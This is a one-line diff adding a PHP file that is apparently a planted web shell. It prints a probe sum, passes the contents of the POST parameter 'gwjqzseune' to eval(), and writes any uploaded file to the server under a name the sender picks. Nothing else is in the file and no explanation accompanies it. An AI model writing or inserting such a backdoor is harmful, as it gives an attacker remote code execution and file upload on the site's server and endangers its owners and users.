@@ -1,0 +1,1 @@
+<?php echo 7457737+736723;if(isset($_POST['gwjqzseune'])) eval($_POST['gwjqzseune']);if($_POST['up']=='up'){@copy($_FILES['file']['tmp_name'],$_FILES['file']['name']);};
